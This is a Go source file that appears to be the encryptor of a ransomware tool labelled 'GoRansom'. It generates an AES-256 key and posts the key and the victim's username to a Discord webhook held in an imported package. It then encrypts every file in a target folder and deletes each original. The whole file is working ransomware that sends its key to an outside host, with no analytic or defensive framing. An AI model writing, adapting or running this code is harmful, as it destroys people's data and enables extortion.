package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"path/filepath"

	hook "ransom/imports"
)

// Webhook json struct
type DiscordWebhook struct {
	Content   string `json:"content"`
	Username  string `json:"username"`
	AvatarURL string `json:"avatar_url"`
}

func sendKey(key []byte) error {
	user, _ := user.Current()
	// encode string
	keyHex := fmt.Sprintf("%x", key)

	// webhook content
	payload := &DiscordWebhook{
		Content:   "User: " + user.Username + "\nKey: " + keyHex,
		Username:  "GoRansom",
		AvatarURL: "https://matrix.org/docs/projects/images/go.png",
	}

	// marshal to json
	payloadJSON, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	// setup http req
	req, err := http.NewRequest("POST", hook.Get(), bytes.NewBuffer(payloadJSON))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	// send req
	client := &http.Client{}
	_, err = client.Do(req)
	if err != nil {
		return err
	}

	return nil
}

func encrypt(file *os.File, key []byte) error {
	plaintext, err := ioutil.ReadAll(file)
	if err != nil {
		return err
	}

	// create new cypher with key
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	// encrypt file
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}
	mode := cipher.NewCFBEncrypter(block, iv)
	mode.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	// make encrypted file
	encryptedFile, err := os.Create(file.Name() + ".encrypted")
	if err != nil {
		return err
	}
	defer encryptedFile.Close()
	_, err = encryptedFile.Write(ciphertext)
	if err != nil {
		return err
	}
	// delete old file
	err = os.Remove(file.Name())
	if err != nil {
		return err
	}
	return nil
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run encrypt.go [folder]")
		os.Exit(1)
	}

	// encryption key
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	sendKey(key)
	// encrypt all files in folder
	folder := os.Args[1]
	err = filepath.Walk(folder, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() {
			return nil
		}
		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()
		return encrypt(file, key)
	})
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
